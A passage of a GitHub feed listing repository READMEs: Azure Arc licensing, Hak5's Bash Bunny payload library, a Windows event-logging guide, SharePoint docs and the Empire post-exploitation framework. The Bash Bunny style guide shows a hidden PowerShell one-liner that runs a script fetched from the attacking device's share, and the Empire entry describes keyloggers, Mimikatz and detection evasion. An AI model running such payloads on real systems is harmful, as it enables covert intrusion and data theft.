4.0 International Public License&lt;/a&gt;, see the &lt;a href=&#34;https://raw.githubusercontent.com/microsoft/azure_arc/main/LICENSE&#34;&gt;LICENSE&lt;/a&gt; file, and grant you a license to any code in the repository under the &lt;a href=&#34;https://opensource.org/licenses/MIT&#34;&gt;MIT License&lt;/a&gt;, see the &lt;a href=&#34;https://raw.githubusercontent.com/microsoft/azure_arc/main/LICENSE-CODE&#34;&gt;LICENSE-CODE&lt;/a&gt; file.&lt;/p&gt; &#xA;&lt;p&gt;Microsoft, Windows, Microsoft Azure and/or other Microsoft products and services referenced in the documentation may be either trademarks or registered trademarks of Microsoft in the United States and/or other countries. The licenses for this project do not grant you rights to use any Microsoft names, logos, or trademarks. Microsoft&#39;s general trademark guidelines can be found at &lt;a href=&#34;http://go.microsoft.com/fwlink/?LinkID=254653&#34;&gt;http://go.microsoft.com/fwlink/?LinkID=254653&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Privacy information can be found at &lt;a href=&#34;https://privacy.microsoft.com/&#34;&gt;https://privacy.microsoft.com/&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;Microsoft and any contributors reserve all other rights, whether under their respective copyrights, patents, or trademarks, whether by implication, estoppel or otherwise.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>hak5/bashbunny-payloads</title>
    <updated>2022-06-01T01:50:46Z</updated>
    <id>tag:github.com,2022-06-01:/hak5/bashbunny-payloads</id>
    <link href="https://github.com/hak5/bashbunny-payloads" rel="alternate"></link>
    <summary type="html">&lt;p&gt;The Official Bash Bunny Payload Repository&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Payload Library for the Bash Bunny by Hak5&lt;/h1&gt; &#xA;&lt;p&gt;This repository contains payloads and extensions for the Hak5 Bash Bunny. Community developed payloads are listed and developers are encouraged to create pull requests to make changes to or submit new payloads.&lt;/p&gt; &#xA;&lt;h2&gt;About the Bash Bunny&lt;/h2&gt; &#xA;&lt;p&gt;By emulating combinations of trusted USB devices — like gigabit Ethernet, serial, flash storage and keyboards — the Bash Bunny tricks computers into divulging data, exfiltrating documents, installing backdoors and many more exploits.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://hak5.org/products/bash-bunny&#34; title=&#34;Purchase at Hak5&#34;&gt;Purchase at Hak5&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://docs.hak5.org/bash-bunny/&#34; title=&#34;Documentation&#34;&gt;Documentation&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://forums.hak5.org/forum/92-bash-bunny/&#34; title=&#34;Forums&#34;&gt;Bash Bunny Forums&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Discord: &lt;a href=&#34;https://hak5.org/discord&#34;&gt;https://hak5.org/discord&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://cdn.shopify.com/s/files/1/0068/2142/products/bash-bunny-mk2_001_c58d9658-b151-4328-af26-11eef3c47355_300x.jpg&#34; alt=&#34;enter image description here&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Documentation&lt;/h2&gt; &#xA;&lt;p&gt;Documentation on developing payloads for the Bash Bunny can be found on the &lt;a href=&#34;https://docs.hak5.org/bash-bunny/&#34;&gt;docs.hak5.org&lt;/a&gt; website. Guides can be found on the &lt;a href=&#34;https://hak5.org/blogs/bash-bunny&#34;&gt;Bash Bunny blog&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Disclaimer&lt;/h2&gt; &#xA;&lt;p&gt;Generally, payloads may execute commands on your device. As such, it is possible for a payload to damage your device. Payloads from this repository are provided AS-IS without warranty. While Hak5 makes a best effort to review payloads, there are no guarantees as to their effectiveness. As with any script, you are advised to proceed with caution.&lt;/p&gt; &#xA;&lt;h2&gt;Legal&lt;/h2&gt; &#xA;&lt;p&gt;Payloads from this repository are provided for educational purposes only. Hak5 gear is intended for authorized auditing and security analysis purposes only where permitted subject to local and international laws where applicable. Users are solely responsible for compliance with all laws of their locality. Hak5 LLC and affiliates claim no responsibility for unauthorized or unlawful use.&lt;/p&gt; &#xA;&lt;h2&gt;Contributing&lt;/h2&gt; &#xA;&lt;p&gt;Once you have developed your payload, you are encouraged to contribute to this repository by submitting a Pull Request. Reviewed and Approved pull requests will add your payload to this repository, where they may be publically available.&lt;/p&gt; &#xA;&lt;p&gt;Please adhere to the following best practices and style guide when submitting a payload.&lt;/p&gt; &#xA;&lt;h3&gt;Naming Conventions&lt;/h3&gt; &#xA;&lt;p&gt;Please give your payload a unique and descriptive name. Do not use spaces in payload names. Each payload should be submit into its own directory, with &lt;code&gt;-&lt;/code&gt; or &lt;code&gt;_&lt;/code&gt; used in place of spaces, to one of the categories such as exfiltration, phishing, remote_access or recon. Do not create your own category.&lt;/p&gt; &#xA;&lt;h3&gt;Binaries&lt;/h3&gt; &#xA;&lt;p&gt;Binaries may not be accepted in this repository. If a binary is used in conjunction with the payload, please document where it or its source may be obtained.&lt;/p&gt; &#xA;&lt;h3&gt;Comments&lt;/h3&gt; &#xA;&lt;p&gt;Payloads should begin with comments specifying at the very least the name of the payload and author. Additional information such as a brief description, the target, any dependencies / prerequisites and the LED status used is helpful.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;Title: SMB Exfiltrator&#xA;Description: Exfiltrates files from %userprofile%\documents via SMB&#xA;Author: Hak5Darren&#xA;Target: Windows XP SP3 - Latest&#xA;Dependencies: impacket&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Configuration Options&lt;/h3&gt; &#xA;&lt;p&gt;Configurable options should be specified in variables at the top of the payload.txt file&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;# Options&#xA;RESPONDER_OPTIONS=&#34;-w -r -d -P&#34;&#xA;LOOTDIR=/root/udisk/loot/quickcreds&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;LED&lt;/h3&gt; &#xA;&lt;p&gt;The payload should use common payload states rather than unique color/pattern combinations when possible with an LED command preceding the Stage or ATTACKMODE.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;# Initialization&#xA;LED SETUP&#xA;GET SWITCH_POSITION&#xA;GET HOST_IP&#xA;&#xA;# Attack&#xA;LED ATTACK&#xA;ATTACKMODE HID ECM_ETHERNET&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Stages and States&lt;/h3&gt; &#xA;&lt;p&gt;Stages should be documented with comments&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;# Keystroke Injection Stage&#xA;# Runs hidden powershell which executes \\172.16.64.1\s\s.ps1 when available&#xA;GET HOST_IP&#xA;LED STAGE1&#xA;ATTACKMODE HID&#xA;RUN WIN &#34;powershell -WindowStyle Hidden -Exec Bypass \&#34;while (\$true) { If (Test-Connection $HOST_IP -count 1) { \\\\$HOST_IP\\s\\s.ps1; exit } }\&#34;&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Common payload states include a &lt;code&gt;SETUP&lt;/code&gt;, with may include a &lt;code&gt;FAIL&lt;/code&gt; if certain conditions are not met. This is typically followed by either a single &lt;code&gt;ATTACK&lt;/code&gt; or multiple &lt;code&gt;STAGEs&lt;/code&gt;. More complex payloads may include a &lt;code&gt;SPECIAL&lt;/code&gt; function to wait until certain conditions are met. Payloads commonly end with a &lt;code&gt;CLEANUP&lt;/code&gt; phase, such as moving and deleting files or stopping services. A payload may &lt;code&gt;FINISH&lt;/code&gt; when the objective is complete and the device is safe to eject or turn off. These common payload states correspond to &lt;code&gt;LED&lt;/code&gt; states.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>blackhillsinfosec/EventLogging</title>
    <updated>2022-06-01T01:50:46Z</updated>
    <id>tag:github.com,2022-06-01:/blackhillsinfosec/EventLogging</id>
    <link href="https://github.com/blackhillsinfosec/EventLogging" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Automation scripts to deploy Windows Event Forwarding, Sysmon, and custom audit policies in an Active Directory environment.&lt;/p&gt;&lt;hr&gt;&lt;p&gt;&lt;img src=&#34;https://www.blackhillsinfosec.com/wp-content/uploads/2018/12/BHIS-logo-L-1024x1024-400x400.png&#34; alt=&#34;BHIS&#34;&gt;&lt;/p&gt; &#xA;&lt;h1&gt;EventLogging&lt;/h1&gt; &#xA;&lt;p&gt;This repo contains guidance on setting up event logging. This guidance is broken up into sections, Defensive Readiness Condition (DEFCON), and intended to be applied from 5 (lowest) to 1 (highest).&lt;/p&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;Readiness State&lt;/th&gt; &#xA;   &lt;th&gt;Description&lt;/th&gt; &#xA;   &lt;th&gt;Readiness Condition Features&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;DEFCON 1&lt;/td&gt; &#xA;   &lt;td&gt;Breach imminent or occurred&lt;/td&gt; &#xA;   &lt;td&gt;Forensic imaging; Blocking techinques/tools (Server, Workstation, and Network)&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;DEFCON 2&lt;/td&gt; &#xA;   &lt;td&gt;Enhanced Measures&lt;/td&gt; &#xA;   &lt;td&gt;Event Forwarding (Workstation); Threat Hunting&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;DEFCON 3&lt;/td&gt; &#xA;   &lt;td&gt;Heightened Measures&lt;/td&gt; &#xA;   &lt;td&gt;Event Forwarding (Member Servers/apps); Network Device logging; Sysmon/EDR&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;DEFCON 4&lt;/td&gt; &#xA;   &lt;td&gt;Increased Security Measures&lt;/td&gt; &#xA;   &lt;td&gt;Audit policies; Event Forwarding (Domain Controllers); Network Monitoring; Centralized logs&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;DEFCON 5&lt;/td&gt; &#xA;   &lt;td&gt;Default Configurations&lt;/td&gt; &#xA;   &lt;td&gt;Vanilla OS/App/Device logging; No centralized logs&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;p&gt;Initial work on this project will be focused on Windows.&lt;/p&gt; &#xA;&lt;!-- Start Document Outline --&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/blackhillsinfosec/EventLogging/master/#Assumptions&#34;&gt;Assumptions&lt;/a&gt;&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/blackhillsinfosec/EventLogging/master/#active-directory&#34;&gt;Active Directory&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/blackhillsinfosec/EventLogging/master/#powershell&#34;&gt;PowerShell&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/blackhillsinfosec/EventLogging/master/#windows-event-collector&#34;&gt;Windows Event Collector&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/blackhillsinfosec/EventLogging/master/#Deployment&#34;&gt;Deployment&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/blackhillsinfosec/EventLogging/master/#community-contributions&#34;&gt;Community Contributions&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/blackhillsinfosec/EventLogging/master/#license&#34;&gt;License&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;!-- End Document Outline --&gt; &#xA;&lt;hr&gt; &#xA;&lt;h2&gt;Assumptions:&lt;/h2&gt; &#xA;&lt;h3&gt;Active Directory&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Microsoft Active Directory is being used&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;PowerShell&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;PowerShell 5 is being used&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Windows Event Collector&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;A Windows Server running Windows Event Collector (WEC) services can be reached by all logged Windows endpoints.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h2&gt;Deployment:&lt;/h2&gt; &#xA;&lt;p&gt;The scripts are designed to be run DEFCON 4 first followed by DEFCON 3 and then DEFCON 2. Each DEFCON has a script for making changes on a DC these scripts add extra functionality and increase visibility in your deployment. You should review these scripts carefully before running them as some of the changes are difficult to revert once made. DEFCON 3 also contains a script for installing Sysmon for Windows. This script should be run from the DC as it will import a GPO used for deployment.&lt;/p&gt; &#xA;&lt;p&gt;Before deployment, you will need to determine how many WECs you will require and their FQDN Hostname. These hosts should be configured as base Windows Server machines with all of the current updates Windows Server 2016 or higher is recommended. You will then convert the server into a WEC via the WEC-Configurator.ps1 script found in DEFCON4.&lt;/p&gt; &#xA;&lt;p&gt;Change the following files before running the scripts.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/blackhillsinfosec/EventLogging/raw/master/DEFCON4/sites.csv&#34;&gt;/DEFCON4/sites.csv&lt;/a&gt; - Populate site prefix and WEC FQDN.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/blackhillsinfosec/EventLogging/raw/master/DEFCON4/winlogbeat.yml&#34;&gt;/DEFCON4/winlogbeat.yml&lt;/a&gt; - Only required if you plan to ship to an ELK stack. Replace the tags &amp;lt;LogstashIP&amp;gt;, &amp;lt;LogstashPort&amp;gt;, and &amp;lt;CompanyInit&amp;gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Once the files have been edited you can run the scripts on the respective host. The DC scripts will import GPOs. These GPOs must still be linked to the correct OU for the system to work. Suggested GPO links are below.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/blackhillsinfosec/EventLogging/tree/master/DEFCON4/Group-Policy-Objects/SOC-Windows-Event-Forwarding&#34;&gt;SOC-$(SiteName)-Windows-Event-Forwarding&lt;/a&gt; : Link to OU for each site hosts in that OU will ship to respective WEC defined in /DEFCON4/sites.csv. This will be replicated for each row in the CSV.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/blackhillsinfosec/EventLogging/tree/master/DEFCON4/Group-Policy-Objects/SOC-DC-Enhanced-Auditing&#34;&gt;SOC-DC-Enhanced-Auditing&lt;/a&gt; : Link to OU Containing DC’s&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/blackhillsinfosec/EventLogging/tree/master/DEFCON3/Group-Policy-Objects/SOC-WS-Enhanced-Auditing&#34;&gt;SOC-WS-Enhanced-Auditing&lt;/a&gt; : Link to the highest level with workstations&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/blackhillsinfosec/EventLogging/tree/master/DEFCON3/Group-Policy-Objects/SOC-Sysmon-Deployment&#34;&gt;SOC-Sysmon-Deployment&lt;/a&gt; : Link to the entire domain&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/blackhillsinfosec/EventLogging/tree/master/DEFCON2/Group-Policy-Objects/SOC-CMD-PS-Logging&#34;&gt;SOC-CMD-PS-Logging&lt;/a&gt; : Link to the entire domain&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/blackhillsinfosec/EventLogging/tree/master/DEFCON3/Group-Policy-Objects/SOC-Enable-WinRM&#34;&gt;SOC-Enable-WinRM&lt;/a&gt; : Link to the entire domain&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h2&gt;Community Contributions&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;palantir windows-event-forwarding | &lt;a href=&#34;https://github.com/palantir/windows-event-forwarding&#34;&gt;GitHub&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;olafhartong sysmon-modular | &lt;a href=&#34;https://github.com/olafhartong/sysmon-modular&#34;&gt;GitHub&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h2&gt;License&lt;/h2&gt; &#xA;&lt;p&gt;GNUv3 - &lt;a href=&#34;https://raw.githubusercontent.com/blackhillsinfosec/EventLogging/master/LICENSE&#34;&gt;License&lt;/a&gt;&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>SharePoint/sp-dev-docs</title>
    <updated>2022-06-01T01:50:46Z</updated>
    <id>tag:github.com,2022-06-01:/SharePoint/sp-dev-docs</id>
    <link href="https://github.com/SharePoint/sp-dev-docs" rel="alternate"></link>
    <summary type="html">&lt;p&gt;SharePoint Developer Documentation&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Welcome to the SharePoint Framework!&lt;/h1&gt; &#xA;&lt;p&gt;The SharePoint Framework (SPFx) is a page and part model that enables client-side development for building SharePoint experiences. It facilitates easy integration with the SharePoint data, and provides support for open source tooling development.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://aka.ms/spfx&#34;&gt;Official SharePoint Framework Documentation&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;This repository contains the raw documents published to docs.microsoft.com site.&lt;/p&gt; &#xA;&lt;h2&gt;Questions &amp;amp; Help&lt;/h2&gt; &#xA;&lt;p&gt;Feel free to use &lt;a href=&#34;https://raw.githubusercontent.com/SharePoint/sp-dev-docs/main/(https://github.com/SharePoint/sp-dev-docs/issues)&#34;&gt;Issues&lt;/a&gt; list to report us potential issues around the SharePoint Framework or gaps in our documentation. You can also submit directly pull requests towards our documentation.&lt;/p&gt; &#xA;&lt;p&gt;You can also tweet / follow &lt;a href=&#34;https://twitter.com/Microsoft365Dev&#34;&gt;@Microsoft365Dev&lt;/a&gt; or &lt;a href=&#34;https://twitter.com/m365pnp&#34;&gt;@m365pnp&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;SharePoint Framework Releases&lt;/h2&gt; &#xA;&lt;p&gt;Review all the SPFx releases here from the initial GA release in February 2017 in the docs: &lt;a href=&#34;https://docs.microsoft.com/sharepoint/dev/spfx/roadmap&#34;&gt;https://docs.microsoft.com/sharepoint/dev/spfx/roadmap&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Get Started&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://docs.microsoft.com/sharepoint/dev/spfx/set-up-your-developer-tenant&#34;&gt;Setup your Office 365 Developer Tenant&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://docs.microsoft.com/sharepoint/dev/spfx/set-up-your-development-environment&#34;&gt;Setup your Machine&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://docs.microsoft.com/sharepoint/dev/spfx/web-parts/get-started/build-a-hello-world-web-part&#34;&gt;Go build your first web part&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Learn More&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://docs.microsoft.com/sharepoint/dev/spfx/sharepoint-framework-overview&#34;&gt;Background and Philosophy&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://docs.microsoft.com/sharepoint/dev/design/design-guidance-overview&#34;&gt;Design Great Web Parts&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/SharePoint/sp-dev-docs/main/javascript/api/sp-application-base&#34;&gt;API Docs&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Updates &amp;amp; Feedback&lt;/h2&gt; &#xA;&lt;p&gt;To keep track of improvements to the Office 365 Framework, please take a look at:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://twitter.com/sharepoint&#34;&gt;@SharePoint&lt;/a&gt;, &lt;a href=&#34;https://twitter.com/Microsoft365Dev&#34;&gt;@Microsoft365Dev&lt;/a&gt; and &lt;a href=&#34;https://twitter.com/m365pnp&#34;&gt;@m365pnp&lt;/a&gt; on Twitter&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://developer.microsoft.com/office/blogs/&#34;&gt;Office Developer Blog&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Provide Feedback:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;If you find issues or have new ideas and suggestions for SharePoint Framework, make sure you submit them &lt;a href=&#34;https://github.com/SharePoint/sp-dev-docs/issues&#34;&gt;here&lt;/a&gt;.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://techcommunity.microsoft.com/t5/SharePoint-Developer/bd-p/SharePointDev&#34;&gt;SharePoint Developer&lt;/a&gt; group at Microsoft Tech Community&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://sharepoint.uservoice.com/forums/329220-sharepoint-dev-platform&#34;&gt;SharePoint Developer UserVoice&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Contribute on the SharePoint Dev Docs&lt;/h2&gt; &#xA;&lt;p&gt;Please see following guidance if you are planning to submit changes on the SharePoint developer documentation. We do welcome your pull requests!&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/SharePoint/sp-dev-docs/raw/master/.github/CONTRIBUTING.md&#34;&gt;Contribution guidance&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/SharePoint/sp-dev-docs/wiki/How-to-Create-Good-Pull-Requests&#34;&gt;How to Create Good Pull Requests&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;If you are a Microsoft contributor, please review official guidance from our &lt;a href=&#34;https://review.docs.microsoft.com/help/contribute/?branch=master&#34;&gt;internal documentation&lt;/a&gt; for docs.microsoft.com contributors&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Have Fun&lt;/h2&gt; &#xA;&lt;p&gt;We look forward to seeing what you build! Please tweet us at @Microsoft365Dev, @m365pnp or @SharePoint with the #SPFx tag!&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>EmpireProject/Empire</title>
    <updated>2022-06-01T01:50:46Z</updated>
    <id>tag:github.com,2022-06-01:/EmpireProject/Empire</id>
    <link href="https://github.com/EmpireProject/Empire" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Empire is a PowerShell and Python post-exploitation agent.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Empire&lt;/h1&gt; &#xA;&lt;h2&gt;This project is no longer supported&lt;/h2&gt; &#xA;&lt;p&gt;Empire is a post-exploitation framework that includes a pure-PowerShell2.0 Windows agent, and a pure Python 2.6/2.7 Linux/OS X agent. It is the merge of the previous PowerShell Empire and Python EmPyre projects. The framework offers cryptologically-secure communications and a flexible architecture. On the PowerShell side, Empire implements the ability to run PowerShell agents without needing powershell.exe, rapidly deployable post-exploitation modules ranging from key loggers to Mimikatz, and adaptable communications to evade network detection, all wrapped up in a usability-focused framework. PowerShell Empire premiered at &lt;a href=&#34;https://www.youtube.com/watch?v=Pq9t59w0mUI&#34;&gt;BSidesLV in 2015&lt;/a&gt; and Python EmPyre premeiered at HackMiami 2016.&lt;/p&gt; &#xA;&lt;p&gt;Empire relies heavily on the work from several other projects for its underlying functionality. We have tried to call out a few of those people we&#39;ve interacted with &lt;a href=&#34;http://www.powershellempire.com/?page_id=2&#34;&gt;heavily here&lt;/a&gt; and have included author/reference link information in the source of each Empire module as appropriate. If we have failed to improperly cite existing or prior work, please let us know.&lt;/p&gt; &#xA;&lt;p&gt;Empire is developed by &lt;a href=&#34;https://twitter.com/harmj0y&#34;&gt;@harmj0y&lt;/a&gt;, &lt;a href=&#34;https://twitter.com/sixdub&#34;&gt;@sixdub&lt;/a&gt;, &lt;a href=&#34;https://twitter.com/enigma0x3&#34;&gt;@enigma0x3&lt;/a&gt;, &lt;a href=&#34;https://twitter.com/424f424f&#34;&gt;rvrsh3ll&lt;/a&gt;, &lt;a href=&#34;https://twitter.com/killswitch_gui&#34;&gt;@killswitch_gui&lt;/a&gt;, and &lt;a href=&#34;https://twitter.com/xorrior&#34;&gt;@xorrior&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Feel free to join us on Slack! &lt;a href=&#34;https://bloodhoundgang.herokuapp.com&#34;&gt;https://bloodhoundgang.herokuapp.com&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Install&lt;/h2&gt; &#xA;&lt;p&gt;To install, run &lt;code&gt;sudo ./setup/install.sh&lt;/code&gt; script or use the corresponding docker image &lt;code&gt;docker pull empireproject/empire&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;There&#39;s also a &lt;a href=&#34;http://www.powershellempire.com/?page_id=110&#34;&gt;quickstart here&lt;/a&gt; and full &lt;a href=&#34;http://www.powershellempire.com/?page_id=83&#34;&gt;documentation here&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Quickstart&lt;/h2&gt; &#xA;&lt;p&gt;Check out the &lt;a href=&#34;https://github.com/EmpireProject/Empire/wiki/Quickstart&#34;&gt;Empire wiki&lt;/a&gt; for instructions on getting started with Empire.&lt;/p&gt; &#xA;&lt;h2&gt;Contribution Rules&lt;/h2&gt; &#xA;&lt;p&gt;Contributions are more than welcome! The more people who contribute to the project the better Empire will be for everyone. Below are a few guidelines for submitting contributions.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Beginning with version 2.4, we will only troubleshoot issues for Kali, Debian, or Ubuntu. All other operating systems will not be supported. We understand that this is frustrating but hopefully the new docker build can provide an alternative.&lt;/li&gt; &#xA; &lt;li&gt;Submit pull requests to the &lt;a href=&#34;https://github.com/powershellempire/Empire/tree/dev&#34;&gt;dev branch&lt;/a&gt;. After testing, changes will be merged to master.&lt;/li&gt; &#xA; &lt;li&gt;Depending on what you&#39;re working on, base your module on &lt;a href=&#34;https://raw.githubusercontent.com/EmpireProject/Empire/master/lib/modules/powershell_template.py&#34;&gt;./lib/modules/powershell_template.py&lt;/a&gt; or &lt;a href=&#34;https://raw.githubusercontent.com/EmpireProject/Empire/master/lib/modules/python_template.py&#34;&gt;./lib/modules/python_template.py&lt;/a&gt;. &lt;strong&gt;Note&lt;/strong&gt; that for some modules you may need to massage the output to get it into a nicely displayable text format &lt;a href=&#34;https://github.com/PowerShellEmpire/Empire/raw/0cbdb165a29e4a65ad8dddf03f6f0e36c33a7350/lib/modules/situational_awareness/network/powerview/get_user.py#L111&#34;&gt;with Out-String&lt;/a&gt;.&lt;/li&gt; &#xA; &lt;li&gt;Cite previous work in the &lt;strong&gt;&#39;Comments&#39;&lt;/strong&gt; module section.&lt;/li&gt; &#xA; &lt;li&gt;If your script.ps1 logic is large, may be reused by multiple modules, or is updated often, consider implementing the logic in the appropriate &lt;strong&gt;data/module_source/&lt;/strong&gt;* directory and &lt;a href=&#34;https://github.com/PowerShellEmpire/Empire/raw/0cbdb165a29e4a65ad8dddf03f6f0e36c33a7350/lib/modules/situational_awareness/network/powerview/get_user.py#L85-L95&#34;&gt;pulling the script contents into the module on tasking&lt;/a&gt;.&lt;/li&gt; &#xA; &lt;li&gt;Use &lt;a href=&#34;https://technet.microsoft.com/en-us/library/ms714428(v=vs.85).aspx&#34;&gt;approved PowerShell verbs&lt;/a&gt; for any functions.&lt;/li&gt; &#xA; &lt;li&gt;PowerShell Version 2 compatibility is &lt;strong&gt;STRONGLY&lt;/strong&gt; preferred.&lt;/li&gt; &#xA; &lt;li&gt;TEST YOUR MODULE! Be sure to run it from an Empire agent before submitting a pull to ensure everything is working correctly.&lt;/li&gt; &#xA; &lt;li&gt;For additional guidelines for your PowerShell code itself, check out the &lt;a href=&#34;https://github.com/PowerShellMafia/PowerSploit/raw/master/README.md&#34;&gt;PowerSploit style guide&lt;/a&gt;.&lt;/li&gt; &#xA;&lt;/ul&gt;</summary>
  </entry>
  <entry>
    <title>microsoft/AL</title>
    <updated>2022-06-01T01:50:46Z</updated>
    <id>tag:github.com,2022-06-01:/microsoft/AL</id>
    <link href="https://github.com/microsoft/AL" rel="alternate"></link>
